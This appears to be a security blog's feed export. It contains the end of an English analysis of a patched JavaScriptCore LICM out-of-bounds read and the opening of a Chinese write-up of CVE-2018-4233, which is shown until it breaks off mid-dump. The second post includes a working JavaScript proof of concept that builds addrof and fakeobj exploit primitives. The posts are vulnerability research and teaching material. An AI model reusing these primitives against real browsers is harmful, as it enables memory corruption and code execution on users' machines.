&#123;</span><br><span class="line">    <span class="keyword">const</span> v14 = v7(v6);</span><br><span class="line">    <span class="keyword">const</span> v15 = v7(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-the-Crash"><a href="#2-the-Crash" class="headerlink" title="2. the Crash"></a>2. the Crash</h1><p>This bug crashes at “v8[-698666199]”, which corresponds to a dfg node GetByVal. </p><ul><li><p>Before LICM phase, @70 GetByVal resides in Block#3, with a @137 CheckInBounds ahead of it.</p></li><li><p>After LICM, it resides in  Block#1, with @137 CheckInBounds still in Block#3.</p></li></ul><p>It means that @70 GetByVal is hoisted during LICM. So read operation happens before check. Thus crash happens.</p><h1 id="3-the-Patch-amp-the-Analysis"><a href="#3-the-Patch-amp-the-Analysis" class="headerlink" title="3. the Patch &amp; the Analysis"></a>3. the Patch &amp; the Analysis</h1><p>After implementing the patch, @70 GetByVal is never hoisted because of it won’t pass edgesDominate in DFGLICMPhase.cpp:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!edgesDominate(m_graph, node, data.preHeader)) &#123;</span><br><span class="line"><span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">dataLog(</span><br><span class="line"><span class="string">"    Not hoisting "</span>, node, <span class="string">" because it isn't loop invariant.n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> tryHoistChecks();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(jsc’s LICM does not strictly implement traditional fundamentals of compiling. It checks doesWrites, readsOverlap, safeToExecute and sort of things. It does not really rely on defs and uses but AbstractHeap.)</p><p>And here is the calling stack:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!edgesDominate(m_graph, node, data.preHeader)) &#123;</span><br><span class="line"></span><br><span class="line">    -&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">edgesDominate</span><span class="params">(Graph&amp; graph, Node* node, BasicBlock* block)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="function">EdgeDominates <span class="title">edgeDominates</span><span class="params">(graph, block)</span></span>;</span><br><span class="line">        DFG_NODE_DO_TO_CHILDREN(graph, node, edgeDominates);  <span class="comment">// macro</span></span><br><span class="line">        <span class="keyword">return</span> edgeDominates.result();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    -&gt;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">void</span> DFGEdgeDominates::<span class="keyword">operator</span>()(Node*, Edge edge)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">bool</span> result = m_graph.m_ssaDominators-&gt;dominates(edge.node()-&gt;owner, m_block); <span class="comment">// It's operation between blocks</span></span><br><span class="line">            <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                dataLog(</span><br><span class="line">                    <span class="string">"Checking if "</span>, edge, <span class="string">" in "</span>, *edge.node()-&gt;owner,</span><br><span class="line">                    <span class="string">" dominates "</span>, *m_block, <span class="string">": "</span>, result, <span class="string">"n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            m_result &amp;= result; <span class="comment">//All node has to have a true as result.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    -&gt;</span><br><span class="line">                </span><br><span class="line">            <span class="function"><span class="keyword">bool</span> <span class="title">dominates</span><span class="params">(<span class="keyword">typename</span> Graph::Node from, <span class="keyword">typename</span> Graph::Node to)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> from == to || strictlyDominates(from, to);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="keyword">bool</span> <span class="title">strictlyDominates</span><span class="params">(<span class="keyword">typename</span> Graph::Node from, <span class="keyword">typename</span> Graph::Node to)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> m_data[to].preNumber &gt; m_data[from].preNumber</span><br><span class="line">                    &amp;&amp; m_data[to].postNumber &lt; m_data[from].postNumber;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>So at function <code>dominates</code>, </p><ul><li><p>the vuln version(the index are the blocks’):</p><p>to 0 from 0</p><p>to 0 from 0</p><p>to 0 from 0</p></li><li><p>the fixed version:</p><p>to 0 from 0</p><p>to 0 from 0</p><p>to 0 from 0</p><p>to 0 <strong>from 3</strong></p><p>m_data[to].preNumber 0           m_data[from].preNumber 3</p><p>m_data[to].postNumber 17         m_data[from].postNumber 0</p></li></ul><p>That’s because an <strong>Edge</strong> is added in the Graph in the fixed version.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">before LICM</span><br><span class="line">Block <span class="comment">#3 (bc#39):</span></span><br><span class="line">Execution count: 10.000000</span><br><span class="line">Predecessors: <span class="comment">#2</span></span><br><span class="line">Successors: <span class="comment">#5</span></span><br><span class="line">Dominated by: <span class="comment">#0 #1 #2 #3</span></span><br><span class="line">Dominates: <span class="comment">#3</span></span><br><span class="line">Dominance Frontier: <span class="comment">#5</span></span><br><span class="line">Iterated Dominance Frontier: <span class="comment">#1 #5</span></span><br><span class="line">States: StructuresAreWatched</span><br><span class="line">Live: @2, @4, @22, @24, @26, @30, @33, @36, @63, @69, @75, @98, @159</span><br><span class="line">Values: @2=&gt;(Other, Undefined, 1:StructuresAreWatched), @4=&gt;(None, none:StructuresAreClobbered), @22=&gt;(Cell, ArrayWithInt32|CopyOnWriteArrayWithInt32, TOP, 1:StructuresAreWatched), @24=&gt;(|Empty, 1:StructuresAreWatched), @26=&gt;(Int32, 1:StructuresAreWatched), @30=&gt;(Cell, TOP, TOP, 1:StructuresAreWatched), @33=&gt;(Int32, 1:StructuresAreWatched), @36=&gt;(BoolInt32, Int32: 0, 1:StructuresAreWatched), @63=&gt;(NonBoolInt32, Int32: 42, 1:StructuresAreWatched), @69=&gt;(NonBoolInt32, Int32: -698666199, 1:StructuresAreWatched), @75=&gt;(BoolInt32, Int32: 1, 1:StructuresAreWatched), @98=&gt;(Other, Null, 1:StructuresAreWatched), @159=&gt;(Int32, 1:StructuresAreWatched)</span><br><span class="line">85:&lt;!0:-&gt; ExitOK(MustGen, W:SideState, bc<span class="comment">#39, ExitValid)</span></span><br><span class="line">55:&lt; 2:-&gt; ToIndexString(KnownInt32:@26, JS|PureInt, String, Exits, bc<span class="comment">#39, ExitValid)</span></span><br><span class="line">89:&lt;!0:-&gt; KillStack(MustGen, loc12, W:Stack(-13), ClobbersExit, bc<span class="comment">#39, ExitValid)</span></span><br><span class="line">56:&lt;!0:-&gt; MovHint(Check:Untyped:@55, MustGen, loc12, W:SideState, ClobbersExit, bc<span class="comment">#39, ExitInvalid)</span></span><br><span class="line">90:&lt;!0:-&gt; KillStack(MustGen, loc7, W:Stack(-8), ClobbersExit, bc<span class="comment">#42, ExitValid)</span></span><br><span class="line">58:&lt;!0:-&gt; MovHint(Check:Untyped:Kill:@55, MustGen, loc7, W:SideState, ClobbersExit, bc<span class="comment">#42, ExitInvalid)</span></span><br><span class="line">93:&lt;!0:-&gt; KillStack(MustGen, loc14, W:Stack(-15), ClobbersExit, bc<span class="comment">#45, ExitValid)</span></span><br><span class="line">61:&lt;!0:-&gt; MovHint(Check:Untyped:@24, MustGen, loc14, W:SideState, ClobbersExit, bc<span class="comment">#45, ExitInvalid)</span></span><br><span class="line">65:&lt;!0:-&gt; FilterPutByIdStatus(Check:Untyped:@22, MustGen, (&lt;Replace: [0x128cafbf0:[Array, &#123;a:100&#125;, ArrayWithInt32, Proto:0x128cf00c0, Leaf]], offset = 100, &gt;), W:SideState, bc<span class="comment">#48, ExitValid)</span></span><br><span class="line">66:&lt;!0:-&gt; CheckStructure(Cell:@22, MustGen, [%Bv:Array], R:JSCell_structureID, Exits, bc<span class="comment">#48, ExitValid)</span></span><br><span class="line">68:&lt;!0:-&gt; PutByOffset(Check:Untyped:@4, KnownCell:@22, Check:Untyped:@63, MustGen, id0&#123;a&#125;, 100, W:NamedProperties(0), ClobbersExit, bc<span class="comment">#48, ExitValid)</span></span><br><span class="line"></span><br><span class="line">137:&lt;!1:-&gt; CheckInBounds(Int32:@69, KnownInt32:Kill:@159, JS|MustGen|PureInt, Int32, Exits, bc<span class="comment">#54, ExitValid)</span></span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">70:&lt;!1:-&gt; GetByVal(KnownCell:@22, Int32:@69, Check:Untyped:Kill:@4, JS|MustGen|VarArgs|PureInt, Int32, Int32+Array+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedInt32Properties, Exits, bc<span class="comment">#54, ExitValid) predicting Other</span></span><br><span class="line"></span><br><span class="line">fixed:</span><br><span class="line">70:&lt;!1:-&gt; GetByVal(KnownCell:@22(Block<span class="comment">#0), Int32:@69(Block#0), Check:Untyped:Kill:@4(Block#0), Check:Untyped:Kill:@137(Block#3), JS|MustGen|VarArgs|PureInt, Int32, Int32+Array+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedInt32Properties, Exits, bc#54, ExitValid) predicting Other</span></span><br><span class="line"></span><br><span class="line">97:&lt;!0:-&gt; KillStack(MustGen, loc14, W:Stack(-15), ClobbersExit, bc<span class="comment">#54, ExitInvalid)</span></span><br><span class="line">71:&lt;!0:-&gt; MovHint(Check:Untyped:Kill:@70, MustGen, loc14, W:SideState, ClobbersExit, bc<span class="comment">#54, ExitInvalid)</span></span><br><span class="line">73:&lt;!0:-&gt; Jump(MustGen, T:<span class="comment">#5, W:SideState, bc#59, ExitValid)</span></span><br><span class="line">States: InvalidBranchDirection, StructuresAreWatched</span><br><span class="line">Live: @2, @22, @24, @26, @30, @33, @36, @63, @69, @75, @98</span><br><span class="line">Values: @2=&gt;(Other, Undefined, 1:StructuresAreWatched), @22=&gt;(Array, ArrayWithInt32, [%Bv:Array], 1:StructuresAreWatched), @24=&gt;(|Empty, 1:StructuresAreWatched), @26=&gt;(Int32, 1:StructuresAreWatched), @30=&gt;(Cell, TOP, TOP, 1:StructuresAreWatched), @33=&gt;(Int32, 1:StructuresAreWatched), @36=&gt;(BoolInt32, Int32: 0, 1:StructuresAreWatched), @63=&gt;(NonBoolInt32, Int32: 42, 1:StructuresAreWatched), @69=&gt;(NonBoolInt32, Int32: -698666199, 1:StructuresAreWatched), @75=&gt;(BoolInt32, Int32: 1, 1:StructuresAreWatched), @98=&gt;(Other, Null, 1:StructuresAreWatched)</span><br></pre></td></tr></table></figure><p>So we could know that the core of the patch is as follows:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> @@ -135,9 +135,14 @@ class SSALoweringPhase : public Phase &#123;</span><br><span class="line">        Node* length = m_insertionSet.insertNode(</span><br><span class="line">            m_nodeIndex, SpecInt32Only, op, m_node-&gt;origin,</span><br><span class="line">            OpInfo(m_node-&gt;arrayMode().asWord()), Edge(base.node(), KnownCellUse), storage);</span><br><span class="line"><span class="deletion">-        m_insertionSet.insertNode(</span></span><br><span class="line"><span class="addition">+        Node* checkInBounds = m_insertionSet.insertNode(</span></span><br><span class="line">            m_nodeIndex, SpecInt32Only, CheckInBounds, m_node-&gt;origin,</span><br><span class="line">            index, Edge(length, KnownInt32Use));</span><br><span class="line"></span><br><span class="line"><span class="addition">+        AdjacencyList adjacencyList = m_graph.copyVarargChildren(m_node);</span></span><br><span class="line"><span class="addition">+        m_graph.m_varArgChildren.append(Edge(checkInBounds, UntypedUse));</span></span><br><span class="line"><span class="addition">+        adjacencyList.setNumChildren(adjacencyList.numChildren() + 1);</span></span><br><span class="line"><span class="addition">+        m_node-&gt;children = adjacencyList;</span></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>(The HasIndexedProperty stuff has nothing to do with this bug. It is modified in the patch because in lowerBoundsCheck is modified in DFGSSALowingPhase.cpp because it relies on that function.)</p><p>So there is a first one condition that a node should meet if the node would be hoisted during LICM phase:</p><ul><li>All of the nodes’ children should dominates the loop’s preheader.</li></ul><p>In this case, Block#0 is definately loop’s preheader. And GetByVal has children:</p><ul><li>base@22</li><li>index@69</li><li>storage@4</li></ul><p>Those children all belong to Block#0. And the <strong>4th child</strong> in the fixed version:</p><ul><li>@137 CheckInBounds</li></ul><p>What makes @137 CheckInBounds the 4th child of GetByVal is an <strong>artificial</strong> (because there isn’t actually any data dependency) dataflow edge between the CheckInBounds and the GetByVal.</p><p>So in the vuln verison, we have Block#0 not-strictly dominate Block#0, and in the vuln version Block#3 not dominate Block#0 which determines the existence of the vulnerability. Thus GetByVal can never be hoisted in front of the check.</p><p>(Thanks for saelo’s advice on emphasizing the artificial dataflow edge here. )</p><h1 id="4-about-CheckInBounds"><a href="#4-about-CheckInBounds" class="headerlink" title="4. about CheckInBounds"></a>4. about CheckInBounds</h1><p>@137 CheckInBounds is never hoisted. Because before LICM phase(the 42th phase) it is like:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">137:&lt;!0:-&gt;CheckInBounds(Int32:@69, KnownInt32:Kill:@159, MustGen, Int32, Exits, bc<span class="comment">#54, ExitValid)</span></span><br></pre></td></tr></table></figure><p>And @69 resides in Block#0 and @159 resides in Block#2. And Block#2 does not dominate Block#0. So.</p><p>There is a @224 CheckInBounds inserted before @70 GetByVal during DFGSSALoweringPhase (the 25th phase):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">224:&lt;!0:-&gt;CheckInBounds(Int32:@69, Check:KnownInt32:@256, JS|MustGen|PureInt, Int32, Exits, bc<span class="comment">#54, ExitValid)</span></span><br><span class="line">70:&lt;!0:-&gt;GetByVal(KnownCell:@303, Int32:@69, Check:Untyped:@67, Check:Untyped:@224, JS|MustGen|VarArgs|PureInt, Int32, Int32+Array+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedInt32Properties, Exits, bc<span class="comment">#54, ExitValid)  predicting Other</span></span><br></pre></td></tr></table></figure><p>And @224 CheckInBounds is then changed to @137 CheckInBounds  during some modification on index of graph in DFGObjectAllocationSinkingPhase(DFG phase object allocation elimination):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">137:&lt;!1:-&gt;CheckInBounds(Int32:@69, KnownInt32:Kill:@159, JS|MustGen|PureInt, Int32, Exits, bc<span class="comment">#54, ExitValid)</span></span><br><span class="line">70:&lt;!1:-&gt;GetByVal(KnownCell:@22, Int32:@69, Check:Untyped:Kill:@4, Check:Untyped:Kill:@137, JS|MustGen|VarArgs|PureInt, Int32, Int32+Array+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedInt32Properties, Exits, bc<span class="comment">#54, ExitValid)  predicting Other</span></span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>vuln</th><th>fixed</th></tr></thead><tbody><tr><td>25th phase: DFGSSALoweringPhase</td><td><code>224:&lt;!0:-&gt; CheckInBounds(Int32:@69, Check:KnownInt32:@256, MustGen, Int32, Exits, bc#54, ExitValid)</code></td><td><code>224:&lt;!0:-&gt; CheckInBounds(Int32:@69, Check:KnownInt32:@256, JSMustGenPureInt, Int32, Exits, bc#54, ExitValid)</code></td></tr><tr><td></td><td><code>70:&lt;!0:-&gt; GetByVal(KnownCell:@303, Int32:@69, Check:Untyped:@67, JSMustGen VarArgs PureInt, Int32, Int32+Array+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedInt32Properties, Exits, bc#54, ExitValid)  predicting Other</code></td><td><code>70:&lt;!0:-&gt; GetByVal(KnownCell:@303, Int32:@69, Check:Untyped:@67, **Check:Untyped:@224**, JS MustGen VarArgs PureInt, Int32, Int32+Array+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedInt32Properties, Exits, bc#54, ExitValid)  predicting Other</code></td></tr><tr><td>36th phase: DFGObjectAlloactionSinkingPhase</td><td><code>137:&lt;!0:-&gt; CheckInBounds(Int32:@69, KnownInt32:Kill:@159, MustGen, Int32, Exits, bc#54, ExitValid)</code></td><td><code>137:&lt;!1:-&gt; CheckInBounds(Int32:@69, KnownInt32:Kill:@159, JS MustGen PureInt, Int32, Exits, bc#54, ExitValid)</code></td></tr><tr><td></td><td><code>70:&lt;!1:-&gt; GetByVal(KnownCell:@22, Int32:@69, Check:Untyped:Kill:@4, JS MustGen VarArgs PureInt, Int32, Int32+Array+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedInt32Properties, Exits, bc#54, ExitValid)  predicting Other</code></td><td><code>70:&lt;!1:-&gt; GetByVal(KnownCell:@22, Int32:@69, Check:Untyped:Kill:@4, **Check:Untyped:Kill:@137**, JS MustGen VarArgs PureInt, Int32, Int32+Array+InBounds+AsIs+Read, R:Butterfly_publicLength,IndexedInt32Properties, Exits, bc#54, ExitValid)  predicting Other</code></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-References-and-PoC&quot;&gt;&lt;a href=&quot;#1-References-and-PoC&quot; class=&quot;headerlink&quot; title=&quot;1. References and PoC&quot;&gt;&lt;/a&gt;1. References and PoC&lt;/h1
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion</title>
    <link href="https://dwfault.github.io/2019/12/20/CVE-2018-4233%20WebKit%20DFG%20JIT%20CreateThis%20SideEffect%20type%20confusion/"/>
    <id>https://dwfault.github.io/2019/12/20/CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion/</id>
    <published>2019-12-20T04:13:28.659Z</published>
    <updated>2019-12-20T04:13:28.659Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>CVE-2018-4233是Pwn2Own 2018上Samuel Groß团队用来攻破Safari浏览器的漏洞。这是一个JIT编译器中side effect导致IR建模失败而产生的一个类型混淆漏洞，通过这样的类型混淆漏洞可以得到addrof、fakeobj两个原语，从而直接获得沙箱内远程代码执行的效果。</p><p>CVE-2018-4233是JIT中的类型混淆漏洞中的一个经典，非常有代表性。</p><h3 id="二、漏洞概要"><a href="#二、漏洞概要" class="headerlink" title="二、漏洞概要"></a>二、漏洞概要</h3><p>该漏洞的fix位于<a href="https://github.com/WebKit/webkit/commit/b602e9d167b2c53ed96a42ed3ee611d237f5461a" target="_blank" rel="noopener">https://github.com/WebKit/webkit/commit/b602e9d167b2c53ed96a42ed3ee611d237f5461a</a>，本文基于其parent commit </p><p>7996e60。该版本更新时间是2018年3月末，PoC:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> someObject = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> addrOfObject = primitiveAddrOf(someObject);</span><br><span class="line">print(addrOfObject);</span><br><span class="line"><span class="comment">//let craftedAddress = 3.54484805889626e-310;</span></span><br><span class="line"><span class="keyword">let</span> craftedAddress = addrOfObject;</span><br><span class="line"><span class="keyword">let</span> fakeObj = primitiveFakeObj(craftedAddress);</span><br><span class="line">print(fakeObj);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveAddrOf</span>(<span class="params">someObject</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">         res = arr[<span class="number">0</span>];      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="number">1.1</span>;</span><br><span class="line">    <span class="keyword">let</span> trigger = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> handler = &#123;</span><br><span class="line">        get(target, propname) &#123;</span><br><span class="line">            <span class="keyword">if</span> (trigger)</span><br><span class="line">                arr[<span class="number">0</span>] = someObject;</span><br><span class="line">            <span class="keyword">return</span> target[propname];</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> visitProxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(visit, handler);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        <span class="keyword">new</span> visitProxy(arr, <span class="number">13.37</span>);</span><br><span class="line"></span><br><span class="line">    trigger = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">new</span> visitProxy(arr, <span class="number">13.37</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">primitiveFakeObj</span>(<span class="params">craftedAddress</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">assign</span>(<span class="params">arr, value</span>) </span>&#123;</span><br><span class="line">        arr[<span class="number">0</span>] = value;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">let</span> trigger = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    <span class="keyword">let</span> handler = &#123;</span><br><span class="line">        get(target, propname) &#123;</span><br><span class="line">            <span class="keyword">if</span> (trigger) </span><br><span class="line">                arr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">            <span class="keyword">return</span> target[propname];</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> assignProxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(assign, handler);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        <span class="keyword">new</span> assignProxy(arr, <span class="number">13.37</span>);</span><br><span class="line">    trigger = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">new</span> assignProxy(arr, craftedAddress);</span><br><span class="line">    <span class="keyword">return</span> arr[<span class="number">0</span>]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、基本概念"><a href="#三、基本概念" class="headerlink" title="三、基本概念"></a>三、基本概念</h3><p>JIT：即时编译，边运行边产生机器代码，常见于浏览器等脚本执行环境，使用机器码替换高级语言的代码来运行，代替解释器以优化运行速度。</p><p>DFG：dfg在编译原理中用来代表数据流图，在WebKit中是第一层优化编译器：</p><ul><li>LLInt -&gt; baseline JIT -&gt; DFG JIT -&gt; FTL JIT，函数、循环经过多次执行，从解释器到各优化编译器会进行tier up，是从左到右的过程。在这一过程中，JIT编译器会根据之前运行获得(profile)的<strong>类型信息</strong>对函数体中参数、变量的<strong>类型进行假定</strong>，生成代码执行(speculative execute)。</li><li>JIT编译器在执行遇到问题的时候会进行tier down，是从右到左的过程，在WebKit中被称为OSRExit，其实现包括<strong>Jump replacement</strong>等机制。</li></ul><p>side-effect：也被译为“副作用”，更新变量和数据结构的赋值语句。</p><p>IR建模：JIT优化编译器需要对中间表示(IR)的字节码进行建模，精确描述side effect等。在WebKit中有两处代码用于建模：<strong>DFGAbstractInterpreter</strong>、<strong>DFGClobberize</strong>，前者被简称为AI。</p><p>JSValue：JSValue是WebKit JavaScriptCore中用来表示和存储JS执行上下文中对象、整数、浮点数的而定义的一个类。其中重点关注：</p><ul><li>ArrayWithDouble，JS中的双精度浮点数数组，如果一个Array中只包含浮点数，它就是一个ArrayWithDouble类型的数组，<strong>其中的双精度浮点数按照IEEE754的原始浮点数存储</strong>。例如3.54484805889626e-310在内存中存储为0x0000414141414141。</li><li>ArrayWithContiguous，JS中的普通数组，如果一个Array中包含浮点数、对象等，它就是一个ArrayWithContiguous类型的数组，其中<strong>元素按照JSValue方式存储</strong>，其中对象指针用48位表示，前16位为0，而浮点数加上了0x0001000000000000。例如3.54484805889626e-310在内存中存储为0x0001414141414141。</li></ul><p>ArrayWithDouble、ArrayWithContiguous中浮点数和指针的互相赋值是构造类型混淆漏洞的方法。</p><p>在JIT类型混淆漏洞中，IR建模错误往往是漏洞产生的根本原因。一般过程是：</p><ul><li>通过IR建模错误，</li><li>利用side effect产生回调改变变量类型，</li><li>借助类型特化过的JIT代码，</li><li>赋值ArrayWithContiguous中的元素到ArrayWithDouble中，</li><li>得到类型混淆。</li></ul><h3 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h3><p>本部分以fakeobj这个原语为例解析这个漏洞，addof原语的构造与其极其相似，不需要调试稍作修改即可。</p><p><img src="CVE-2018-4233 WebKit DFG JIT CreateThis SideEffect type confusion.assets/image-20190102134532994-6407933.png" alt="image-20190102134532994"></p><p>设置调试目标为jsc，参数添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--useConcurrentJIT=<span class="literal">false</span></span><br><span class="line">--dumpDisassembly=<span class="literal">true</span></span><br><span class="line">--dumpDFGDisassembly=<span class="literal">true</span></span><br><span class="line">--useFTLJIT=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>开始运行，从输出中可见，assign、get产生了DFG JIT代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Generated DFG JIT code <span class="keyword">for</span> assign<span class="comment">#EmOb1Y:[0x11cd78720-&gt;0x11cd78260-&gt;0x11cd98f20, DFGFunctionConstruct, 24], instruction count = 24:</span></span><br><span class="line">Optimized with execution counter = 150.000000/1133.000000, -850</span><br><span class="line">Code at [0x372925000780, 0x372925000dc0</span><br><span class="line">...</span><br><span class="line">Generated DFG JIT code <span class="keyword">for</span> get<span class="comment">#CsfvpT:[0x11cd78980-&gt;0x11cd784c0-&gt;0x11cd98fd0, DFGFunctionCall, 60], instruction count = 60:</span></span><br><span class="line">Optimized with execution counter = 420.000000/1306.000000, -580</span><br><span class="line">Code at [0x3729250002c0, 